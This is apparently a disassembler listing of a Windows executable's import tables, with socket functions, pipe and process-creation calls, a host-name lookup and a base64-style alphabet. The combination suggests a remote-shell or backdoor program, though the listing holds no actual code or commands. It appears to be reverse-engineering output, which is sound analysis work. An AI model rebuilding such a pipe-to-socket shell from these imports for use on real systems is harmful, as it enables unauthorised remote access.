             DWORD             EAX:4          <RETURN>
             HMODULE           Stack[0x4]:4   hModule
             LPSTR             Stack[0x8]:4   lpFilename
             DWORD             Stack[0xc]:4   nSize
                             373  GetModuleFileNameA  <<not bound>>
                             PTR_GetModuleFileNameA_0040206c                 XREF[1]:     FUN_00401b50:00401b67(R)
        0040206c ba 24 00 00     addr       KERNEL32.DLL::GetModuleFileNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupI
             void              <VOID>         <RETURN>
             LPSTARTUPINFOA    Stack[0x4]:4   lpStartupInfo
                             431  GetStartupInfoA  <<not bound>>
                             PTR_GetStartupInfoA_00402070                    XREF[1]:     entry:00401dde(R)
        00402070 64 26 00 00     addr       KERNEL32.DLL::GetStartupInfoA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
             HMODULE           EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpModuleName
                             375  GetModuleHandleA  <<not bound>>
                             PTR_GetModuleHandleA_00402074                   XREF[1]:     entry:00401e02(R)
        00402074 50 26 00 00     addr       KERNEL32.DLL::GetModuleHandleA
        00402078 00              ??         00h
        00402079 00              ??         00h
        0040207a 00              ??         00h
        0040207b 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             uint __cdecl _controlfp(uint _NewValue, uint _Mask)
             uint              EAX:4          <RETURN>
             uint              Stack[0x4]:4   _NewValue
             uint              Stack[0x8]:4   _Mask
                             183  _controlfp  <<not bound>>
                             PTR__controlfp_0040207c                         XREF[1]:     _controlfp:00401e66
        0040207c 2a 26 00 00     addr       MSVCRT.DLL::_controlfp
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             uintptr_t __cdecl _beginthread(_StartAddress * _StartAdd
             uintptr_t         EAX:4          <RETURN>
             _StartAddress *   Stack[0x4]:4   _StartAddress
             uint              Stack[0x8]:4   _StackSize
             void *            Stack[0xc]:4   _ArgList
                             165  _beginthread  <<not bound>>
                             PTR__beginthread_00402080                       XREF[1]:     _beginthread:00401cb0
        00402080 28 25 00 00     addr       MSVCRT.DLL::_beginthread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl _strnicmp(char * _Str1, char * _Str2, size_t
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str1
             char *            Stack[0x8]:4   _Str2
             size_t            Stack[0xc]:4   _MaxCount
                             453  _strnicmp  <<not bound>>
                             PTR__strnicmp_00402084                          XREF[1]:     _strnicmp:00401cb6
        00402084 38 25 00 00     addr       MSVCRT.DLL::_strnicmp
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl sprintf(char * _Dest, char * _Format, ...)
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Dest
             char *            Stack[0x8]:4   _Format
                             690  sprintf  <<not bound>>
                             PTR_sprintf_00402088                            XREF[1]:     sprintf:00401cbc
        00402088 44 25 00 00     addr       MSVCRT.DLL::sprintf
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             long __cdecl atol(char * _Str)
             long              EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
                             574  atol  <<not bound>>
                             PTR_atol_0040208c                               XREF[1]:     atol:00401cc2
        0040208c 4e 25 00 00     addr       MSVCRT.DLL::atol
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             char * __cdecl strchr(char * _Str, int _Val)
             char *            EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
             int               Stack[0x8]:4   _Val
                             695  strchr  <<not bound>>
                             PTR_strchr_00402090                             XREF[1]:     strchr:00401cc8
        00402090 56 25 00 00     addr       MSVCRT.DLL::strchr
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __cdecl free(void * _Memory)
             void              <VOID>         <RETURN>
             void *            Stack[0x4]:4   _Memory
                             606  free  <<not bound>>
                             PTR_free_00402094                               XREF[1]:     free:00401cce
        00402094 60 25 00 00     addr       MSVCRT.DLL::free
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void * __cdecl malloc(size_t _Size)
             void *            EAX:4          <RETURN>
             size_t            Stack[0x4]:4   _Size
                             657  malloc  <<not bound>>
                             PTR_malloc_00402098                             XREF[1]:     malloc:00401cd4
        00402098 68 25 00 00     addr       MSVCRT.DLL::malloc
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __cdecl _exit(int _Code)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   _Code
                             211  _exit  <<not bound>>
                             PTR__exit_0040209c                              XREF[1]:     00401e32(R)
        0040209c 7e 25 00 00     addr       MSVCRT.DLL::_exit
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl _XcptFilter(ulong _ExceptionNum, _EXCEPTION_
             int               EAX:4          <RETURN>
             ulong             Stack[0x4]:4   _ExceptionNum
             _EXCEPTION_POI    Stack[0x8]:4   _ExceptionPtr
                             72  _XcptFilter  <<not bound>>
                             PTR__XcptFilter_004020a0                        XREF[1]:     _XcptFilter:00401e38
        004020a0 86 25 00 00     addr       MSVCRT.DLL::_XcptFilter
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __cdecl exit(int _Code)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   _Code
                             585  exit  <<not bound>>
                             PTR_exit_004020a4                               XREF[1]:     entry:00401e12(R)
        004020a4 94 25 00 00     addr       MSVCRT.DLL::exit
                             143  _acmdln  <<not bound>>
                             PTR__acmdln_004020a8                            XREF[1]:     entry:00401da7(R)
        004020a8 9c 25 00 00     addr       MSVCRT.DLL::_acmdln
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __cdecl __getmainargs(int * _Argc, char * * * _Argv,
             int               EAX:4          <RETURN>
             int *             Stack[0x4]:4   _Argc
             char * * *        Stack[0x8]:4   _Argv
             char * * *        Stack[0xc]:4   _Env
             int               Stack[0x10]:4  _DoWildCard
             _startupinfo *    Stack[0x14]:4  _StartInfo
                             88  __getmainargs  <<not bound>>
                             PTR___getmainargs_004020ac                      XREF[1]:     entry:00401d8f(R)
        004020ac a6 25 00 00     addr       MSVCRT.DLL::__getmainargs
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __cdecl initterm()
             undefined         <UNASSIGNED>   <RETURN>
                             271  _initterm  <<not bound>>
                             PTR_initterm_004020b0                           XREF[1]:     initterm:00401e3e
        004020b0 b6 25 00 00     addr       MSVCRT.DLL::initterm
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __setusermatherr()
             undefined         <UNASSIGNED>   <RETURN>
                             131  __setusermatherr  <<not bound>>
                             PTR___setusermatherr_004020b4                   XREF[1]:     entry:00401d56(R)
        004020b4 c2 25 00 00     addr       MSVCRT.DLL::__setusermatherr
                             157  _adjust_fdiv  <<not bound>>
                             PTR__adjust_fdiv_004020b8                       XREF[1]:     entry:00401d38(R)
        004020b8 d6 25 00 00     addr       MSVCRT.DLL::_adjust_fdiv
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __p__commode()
             undefined         <UNASSIGNED>   <RETURN>
                             106  __p__commode  <<not bound>>
                             PTR___p__commode_004020bc                       XREF[1]:     entry:00401d2a(R)
        004020bc e6 25 00 00     addr       MSVCRT.DLL::__p__commode
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined __p__fmode()
             undefined         <UNASSIGNED>   <RETURN>
                             111  __p__fmode  <<not bound>>
                             PTR___p__fmode_004020c0                         XREF[1]:     entry:00401d1c(R)
        004020c0 f6 25 00 00     addr       MSVCRT.DLL::__p__fmode
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __cdecl __set_app_type(int param_1)
             void              <VOID>         <RETURN>
             int               Stack[0x4]:4   param_1
                             129  __set_app_type  <<not bound>>
                             PTR___set_app_type_004020c4                     XREF[1]:     entry:00401d07(R)
        004020c4 04 26 00 00     addr       MSVCRT.DLL::__set_app_type
                             202  _except_handler3  <<not bound>>
        004020c8 16 26 00 00     addr       MSVCRT.DLL::_except_handler3
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             char * __cdecl _itoa(int _Value, char * _Dest, int _Radix)
             char *            EAX:4          <RETURN>
             int               Stack[0x4]:4   _Value
             char *            Stack[0x8]:4   _Dest
             int               Stack[0xc]:4   _Radix
                             308  _itoa  <<not bound>>
        004020cc 76 26 00 00     addr       MSVCRT.DLL::_itoa
        004020d0 00              ??         00h
        004020d1 00              ??         00h
        004020d2 00              ??         00h
        004020d3 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall ShellExecuteExA(SHELLEXECUTEINFOA * pExec
             BOOL              EAX:4          <RETURN>
             SHELLEXECUTEIN    Stack[0x4]:4   pExecInfo
                             265  ShellExecuteExA  <<not bound>>
                             PTR_ShellExecuteExA_004020d4                    XREF[1]:     FUN_00401b50:00401c51(R)
        004020d4 0a 25 00 00     addr       SHELL32.DLL::ShellExecuteExA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall SHChangeNotify(LONG wEventId, UINT uFlags
             void              <VOID>         <RETURN>
             LONG              Stack[0x4]:4   wEventId
             UINT              Stack[0x8]:4   uFlags
             LPCVOID           Stack[0xc]:4   dwItem1
             LPCVOID           Stack[0x10]:4  dwItem2
                             126  SHChangeNotify  <<not bound>>
                             PTR_SHChangeNotify_004020d8                     XREF[1]:     FUN_00401b50:00401c7c(R)
        004020d8 f8 24 00 00     addr       SHELL32.DLL::SHChangeNotify
        004020dc 00              ??         00h
        004020dd 00              ??         00h
        004020de 00              ??         00h
        004020df 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             int __stdcall LoadStringA(HINSTANCE hInstance, UINT uID,
             int               EAX:4          <RETURN>
             HINSTANCE         Stack[0x4]:4   hInstance
             UINT              Stack[0x8]:4   uID
             LPSTR             Stack[0xc]:4   lpBuffer
             int               Stack[0x10]:4  cchBufferMax
                             458  LoadStringA  <<not bound>>
                             PTR_LoadStringA_004020e0                        XREF[1]:     FUN_00401240:00401251(R)
        004020e0 de 24 00 00     addr       USER32.DLL::LoadStringA
        004020e4 00              ??         00h
        004020e5 00              ??         00h
        004020e6 00              ??         00h
        004020e7 00              ??         00h
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_9()
             undefined         <UNASSIGNED>   <RETURN>
                             9  Ordinal_9  <<not bound>>
                             PTR_Ordinal_9_004020e8                          XREF[1]:     Ordinal_9:00401e84
        004020e8 09 00 00 80     addr       WS2_32.DLL::Ordinal_9
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_4()
             undefined         <UNASSIGNED>   <RETURN>
                             4  Ordinal_4  <<not bound>>
                             PTR_Ordinal_4_004020ec                          XREF[1]:     Ordinal_4:00401e78
        004020ec 04 00 00 80     addr       WS2_32.DLL::Ordinal_4
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_23()
             undefined         <UNASSIGNED>   <RETURN>
                             23  Ordinal_23  <<not bound>>
                             PTR_Ordinal_23_004020f0                         XREF[1]:     Ordinal_23:00401e90
        004020f0 17 00 00 80     addr       WS2_32.DLL::Ordinal_23
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_115()
             undefined         <UNASSIGNED>   <RETURN>
                             115  Ordinal_115  <<not bound>>
                             PTR_Ordinal_115_004020f4                        XREF[1]:     Ordinal_115:00401e96
        004020f4 73 00 00 80     addr       WS2_32.DLL::Ordinal_115
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_19()
             undefined         <UNASSIGNED>   <RETURN>
                             19  Ordinal_19  <<not bound>>
                             PTR_Ordinal_19_004020f8                         XREF[1]:     Ordinal_19:00401e6c
        004020f8 13 00 00 80     addr       WS2_32.DLL::Ordinal_19
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_11()
             undefined         <UNASSIGNED>   <RETURN>
                             11  Ordinal_11  <<not bound>>
                             PTR_Ordinal_11_004020fc                         XREF[1]:     Ordinal_11:00401e7e
        004020fc 0b 00 00 80     addr       WS2_32.DLL::Ordinal_11
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_16()
             undefined         <UNASSIGNED>   <RETURN>
                             16  Ordinal_16  <<not bound>>
                             PTR_Ordinal_16_00402100                         XREF[1]:     Ordinal_16:00401e72
        00402100 10 00 00 80     addr       WS2_32.DLL::Ordinal_16
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_3()
             undefined         <UNASSIGNED>   <RETURN>
                             3  Ordinal_3  <<not bound>>
                             PTR_Ordinal_3_00402104                          XREF[1]:     Ordinal_3:00401e8a
        00402104 03 00 00 80     addr       WS2_32.DLL::Ordinal_3
        00402108 00              ??         00h
        00402109 00              ??         00h
        0040210a 00              ??         00h
        0040210b 00              ??         00h
        0040210c 00              ??         00h
        0040210d 00              ??         00h
        0040210e 00              ??         00h
        0040210f 00              ??         00h
        00402110 41              ??         41h    A
        00402111 42              ??         42h    B
        00402112 43              ??         43h    C
        00402113 44              ??         44h    D
        00402114 45              ??         45h    E
        00402115 46              ??         46h    F
        00402116 47              ??         47h    G
        00402117 48              ??         48h    H
        00402118 49              ??         49h    I
        00402119 4a              ??         4Ah    J
        0040211a 4b              ??         4Bh    K
        0040211b 4c              ??         4Ch    L
        0040211c 4d              ??         4Dh    M
        0040211d 4e              ??         4Eh    N
        0040211e 4f              ??         4Fh    O
        0040211f 50              ??         50h    P
        00402120 51              ??         51h    Q
        00402121 52              ??         52h    R
        00402122 53              ??         53h    S
        00402123 54              ??         54h    T
        00402124 55              ??         55h    U
        00402125 56              ??         56h    V
        00402126 57              ??         57h    W
        00402127 58              ??         58h    X
        00402128 59              ??         59h    Y
        00402129 5a              ??         5Ah    Z
        0040212a 61              ??         61h    a
        0040212b 62              ??         62h    b
        0040212c 63              ??         63h    c
        0040212d 64              ??         64h    d
        0040212e 65              ??         65h    e
        0040212f 66              ??         66h    f
        00402130 67              ??         67h    g
        00402131 68              ??         68h    h
        00402132 69              ??         69h    i
        00402133 6a              ??         6Ah    j
        00402134 6b              ??         6Bh    k
        00402135 6c              ??         6Ch    l
        00402136 6d              ??         6Dh    m
        00402137 6e              ??         6Eh    n
        00402138 6f              ??         6Fh    o
        00402139 70              ??         70h    p
        0040213a 71              ??         71h    q
        0040213b 72              ??         72h    r
        0040213c 73              ??         73h    s
        0040213d 74              ??         74h    t
        0040213e 75              ??         75h    u
        0040213f 76              ??         76h    v
        00402140 77              ??         77h    w
        00402141 78              ??         78h    x
        00402142 79              ??         79h    y
        00402143 7a              ??         7Ah    z
        00402144 30              ??         30h    0
        00402145 31              ??         31h    1
        00402146 32              ??         32h    2
        00402147 33              ??         33h    3
        00402148 34              ??         34h    4
        00402149 35              ??         35h    5
        0040214a 36              ??         36h    6
        0040214b 37              ??         37h    7
        0040214c 38              ??         38h    8
        0040214d 39              ??         39h    9
        0040214e 2d              ??         2Dh    -
        0040214f 2f              ??         2Fh    /
                             DAT_00402150                                    XREF[1]:     entry:00401cdf(*)
        00402150 ff              ??         FFh
        00402151 ff              ??         FFh
        00402152 ff              ??         FFh
        00402153 ff              ??         FFh
        00402154 18 1e 40 00     addr       LAB_00401e18
        00402158 2c 1e 40 00     addr       LAB_00401e2c
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
                             DWORD_0040215c                                  XREF[1]:     00400160(*)
        0040215c d4 21 00 00     ddw        21D4h
        00402160 00 00 00 00     ddw        0h
        00402164 00 00 00 00     ddw        0h
        00402168 d0 24 00 00     ddw        24D0h
        0040216c 00 20 00 00     ddw        2000h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402170 b4 22 00 00     ddw        22B4h
        00402174 00 00 00 00     ddw        0h
        00402178 00 00 00 00     ddw        0h
        0040217c ec 24 00 00     ddw        24ECh
        00402180 e0 20 00 00     ddw        20E0h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402184 a8 22 00 00     ddw        22A8h
        00402188 00 00 00 00     ddw        0h
        0040218c 00 00 00 00     ddw        0h
        00402190 1c 25 00 00     ddw        251Ch
        00402194 d4 20 00 00     ddw        20D4h
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        00402198 50 22 00 00     ddw        2250h
        0040219c 00 00 00 00     ddw        0h
        004021a0 00 00 00 00     ddw        0h
        004021a4 72 25 00 00     ddw        2572h
        004021a8 7c 20 00 00     ddw        207Ch
                             **************************************************************
                             * IMAGE_IMPORT_DESCRIPTOR                                    *
                             **************************************************************
        004021ac bc 22 00 00     ddw        22BCh
        004021b0 00 00 00 00     ddw        0h
        004021b4 00 00 00 00     ddw        0h
        004021b8 38 26 00 00     ddw        2638h
        004021bc e8 20 00 00     ddw        20E8h
        004021c0 00              ??         00h
        004021c1 00              ??         00h
        004021c2 00              ??         00h
        004021c3 00              ??         00h
        004021c4 00              ??         00h
        004021c5 00              ??         00h
        004021c6 00              ??         00h
        004021c7 00              ??         00h
        004021c8 00              ??         00h
        004021c9 00              ??         00h
        004021ca 00              ??         00h
        004021cb 00              ??         00h
        004021cc 00              ??         00h
        004021cd 00              ??         00h
        004021ce 00              ??         00h
        004021cf 00              ??         00h
        004021d0 00              ??         00h
        004021d1 00              ??         00h
        004021d2 00              ??         00h
        004021d3 00              ??         00h
        004021d4 e0 22 00 00     ddw        22E0h                                            IMAGE_THUNK_DATA32
        004021d8 ee 22 00 00     ddw        22EEh                                            IMAGE_THUNK_DATA32
        004021dc 04 23 00 00     ddw        2304h                                            IMAGE_THUNK_DATA32
        004021e0 14 23 00 00     ddw        2314h                                            IMAGE_THUNK_DATA32
        004021e4 22 23 00 00     ddw        2322h                                            IMAGE_THUNK_DATA32
        004021e8 2a 23 00 00     ddw        232Ah                                            IMAGE_THUNK_DATA32
        004021ec 3e 23 00 00     ddw        233Eh                                            IMAGE_THUNK_DATA32
        004021f0 4c 23 00 00     ddw        234Ch                                            IMAGE_THUNK_DATA32
        004021f4 62 23 00 00     ddw        2362h                                            IMAGE_THUNK_DATA32
        004021f8 76 23 00 00     ddw        2376h                                            IMAGE_THUNK_DATA32
        004021fc 90 23 00 00     ddw        2390h                                            IMAGE_THUNK_DATA32
        00402200 a2 23 00 00     ddw        23A2h                                            IMAGE_THUNK_DATA32
        00402204 b2 23 00 00     ddw        23B2h                                            IMAGE_THUNK_DATA32
        00402208 c4 23 00 00     ddw        23C4h                                            IMAGE_THUNK_DATA32
        0040220c d6 23 00 00     ddw        23D6h                                            IMAGE_THUNK_DATA32
        00402210 ea 23 00 00     ddw        23EAh                                            IMAGE_THUNK_DATA32
        00402214 f6 23 00 00     ddw        23F6h                                            IMAGE_THUNK_DATA32
        00402218 06 24 00 00     ddw        2406h                                            IMAGE_THUNK_DATA32
        0040221c 12 24 00 00     ddw        2412h                                            IMAGE_THUNK_DATA32
        00402220 1e 24 00 00     ddw        241Eh                                            IMAGE_THUNK_DATA32
        00402224 38 24 00 00     ddw        2438h                                            IMAGE_THUNK_DATA32
        00402228 4c 24 00 00     ddw        244Ch                                            IMAGE_THUNK_DATA32
        0040222c 60 24 00 00     ddw        2460h                                            IMAGE_THUNK_DATA32
        00402230 74 24 00 00     ddw        2474h                                            IMAGE_THUNK_DATA32
        00402234 80 24 00 00     ddw        2480h                                            IMAGE_THUNK_DATA32
        00402238 8c 24 00 00     ddw        248Ch                                            IMAGE_THUNK_DATA32
        0040223c a6 24 00 00     ddw        24A6h                                            IMAGE_THUNK_DATA32
        00402240 ba 24 00 00     ddw        24BAh                                            IMAGE_THUNK_DATA32
        00402244 64 26 00 00     ddw        2664h                                            IMAGE_THUNK_DATA32
        00402248 50 26 00 00     ddw        2650h                                            IMAGE_THUNK_DATA32
        0040224c 00              ??         00h
        0040224d 00              ??         00h
        0040224e 00              ??         00h
        0040224f 00              ??         00h
        00402250 2a 26 00 00     ddw        262Ah                                            IMAGE_THUNK_DATA32
        00402254 28 25 00 00     ddw        2528h                                            IMAGE_THUNK_DATA32
        00402258 38 25 00 00     ddw        2538h                                            IMAGE_THUNK_DATA32
        0040225c 44 25 00 00     ddw        2544h                                            IMAGE_THUNK_DATA32
        00402260 4e 25 00 00     ddw        254Eh                                            IMAGE_THUNK_DATA32
        00402264 56 25 00 00     ddw        2556h                                            IMAGE_THUNK_DATA32
        00402268 60 25 00 00     ddw        2560h                                            IMAGE_THUNK_DATA32
        0040226c 68 25 00 00     ddw        2568h                                            IMAGE_THUNK_DATA32
        00402270 7e 25 00 00     ddw        257Eh                                            IMAGE_THUNK_DATA32
        00402274 86 25 00 00     ddw        2586h                                            IMAGE_THUNK_DATA32
        00402278 94 25 00 00     ddw        2594h                                            IMAGE_THUNK_DATA32
        0040227c 9c 25 00 00     ddw        259Ch                                            IMAGE_THUNK_DATA32
        00402280 a6 25 00 00     ddw        25A6h                                            IMAGE_THUNK_DATA32
        00402284 b6 25 00 00     ddw        25B6h                                            IMAGE_THUNK_DATA32
        00402288 c2 25 00 00     ddw        25C2h                                            IMAGE_THUNK_DATA32
        0040228c d6 25 00 00     ddw        25D6h                                            IMAGE_THUNK_DATA32
        00402290 e6 25 00 00     ddw        25E6h                                            IMAGE_THUNK_DATA32
        00402294 f6 25 00 00     ddw        25F6h                                            IMAGE_THUNK_DATA32
        00402298 04 26 00 00     ddw        2604h                                            IMAGE_THUNK_DATA32
        0040229c 16 26 00 00     ddw        2616h                                            IMAGE_THUNK_DATA32
        004022a0 76 26 00 00     ddw        2676h                                            IMAGE_THUNK_DATA32
        004022a4 00              ??         00h
        004022a5 00              ??         00h
        004022a6 00              ??         00h
        004022a7 00              ??         00h
        004022a8 0a 25 00 00     ddw        250Ah                                            IMAGE_THUNK_DATA32
        004022ac f8 24 00 00     ddw        24F8h                                            IMAGE_THUNK_DATA32
        004022b0 00              ??         00h
        004022b1 00              ??         00h
        004022b2 00              ??         00h
        004022b3 00              ??         00h
        004022b4 de 24 00 00     ddw        24DEh                                            IMAGE_THUNK_DATA32
        004022b8 00              ??         00h
        004022b9 00              ??         00h
        004022ba 00              ??         00h
        004022bb 00              ??         00h
        004022bc 09 00 00 80     ddw        80000009h                                        IMAGE_THUNK_DATA32
        004022c0 04 00 00 80     ddw        80000004h                                        IMAGE_THUNK_DATA32
        004022c4 17 00 00 80     ddw        80000017h                                        IMAGE_THUNK_DATA32
        004022c8 73 00 00 80     ddw        80000073h                                        IMAGE_THUNK_DATA32
        004022cc 13 00 00 80     ddw        80000013h                                        IMAGE_THUNK_DATA32
        004022d0 0b 00 00 80     ddw        8000000Bh                                        IMAGE_THUNK_DATA32
        004022d4 10 00 00 80     ddw        80000010h                                        IMAGE_THUNK_DATA32
        004022d8 03 00 00 80     ddw        80000003h                                        IMAGE_THUNK_DATA32
        004022dc 00              ??         00h
        004022dd 00              ??         00h
        004022de 00              ??         00h
        004022df 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004022e0 2e 00           dw         2Eh
        004022e2 43 6c 6f        ds         "CloseHandle"
                 73 65 48
                 61 6e 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004022ee 85 03           dw         385h
        004022f0 57 61 69        ds         "WaitForSingleObject"
                 74 46 6f
                 72 53 69
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402304 49 00           dw         49h
        00402306 43 72 65        ds         "CreateEventA"
                 61 74 65
                 45 76 65
        00402313 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402314 b0 00           dw         B0h
        00402316 45 78 69        ds         "ExitThread"
                 74 54 68
                 72 65 61
        00402321 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402322 49 03           dw         349h
        00402324 53 6c 65        ds         "Sleep"
                 65 70 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040232a 0c 01           dw         10Ch
        0040232c 47 65 74        ds         "GetComputerNameA"
                 43 6f 6d
                 70 75 74
        0040233d 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040233e 5f 00           dw         5Fh
        00402340 43 72 65        ds         "CreatePipe"
                 61 74 65
                 50 69 70
        0040234b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040234c 85 00           dw         85h
        0040234e 44 69 73        ds         "DisconnectNamedPipe"
                 63 6f 6e
                 6e 65 63
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402362 51 03           dw         351h
        00402364 54 65 72        ds         "TerminateProcess"
                 6d 69 6e
                 61 74 65
        00402375 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402376 83 03           dw         383h
        00402378 57 61 69        ds         "WaitForMultipleObjects"
                 74 46 6f
                 72 4d 75
        0040238f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402390 52 03           dw         352h
        00402392 54 65 72        ds         "TerminateThread"
                 6d 69 6e
                 61 74 65
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023a2 69 00           dw         69h
        004023a4 43 72 65        ds         "CreateThread"
                 61 74 65
                 54 68 72
        004023b1 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023b2 60 00           dw         60h
        004023b4 43 72 65        ds         "CreateProcessA"
                 61 74 65
                 50 72 6f
        004023c3 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023c4 8c 00           dw         8Ch
        004023c6 44 75 70        ds         "DuplicateHandle"
                 6c 69 63
                 61 74 65
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023d6 3a 01           dw         13Ah
        004023d8 47 65 74        ds         "GetCurrentProcess"
                 43 75 72
                 72 65 6e
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023ea ab 02           dw         2ABh
        004023ec 52 65 61        ds         "ReadFile"
                 64 46 69
                 6c 65 00
        004023f5 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        004023f6 87 02           dw         287h
        004023f8 50 65 65        ds         "PeekNamedPipe"
                 6b 4e 61
                 6d 65 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402406 0b 03           dw         30Bh
        00402408 53 65 74        ds         "SetEvent"
                 45 76 65
                 6e 74 00
        00402411 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402412 97 03           dw         397h
        00402414 57 72 69        ds         "WriteFile"
                 74 65 46
                 69 6c 65 00
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040241e 28 03           dw         328h
        00402420 53 65 74        ds         "SetProcessPriorityBoost"
                 50 72 6f
                 63 65 73
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402438 38 03           dw         338h
        0040243a 53 65 74        ds         "SetThreadPriority"
                 54 68 72
                 65 61 64
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040244c 3d 01           dw         13Dh
        0040244e 47 65 74        ds         "GetCurrentThread"
                 43 75 72
                 72 65 6e
        0040245f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402460 26 03           dw         326h
        00402462 53 65 74        ds         "SetPriorityClass"
                 50 72 69
                 6f 72 69
        00402473 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402474 b0 03           dw         3B0h
        00402476 6c 73 74        ds         "lstrcatA"
                 72 63 61
                 74 41 00
        0040247f 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        00402480 b9 03           dw         3B9h
        00402482 6c 73 74        ds         "lstrcpyA"
                 72 63 70
                 79 41 00
        0040248b 00              ??         00h
                             **************************************************************
                             * IMAGE_IMPORT_BY_NAME                                       *
                             **************************************************************
        0040248c 50 01           dw         150h
        0040248e 47 65 74        ds         "GetEnvironmentVariableA"
                 45 6e 76
                 69 72 6f
                             **************************************************************
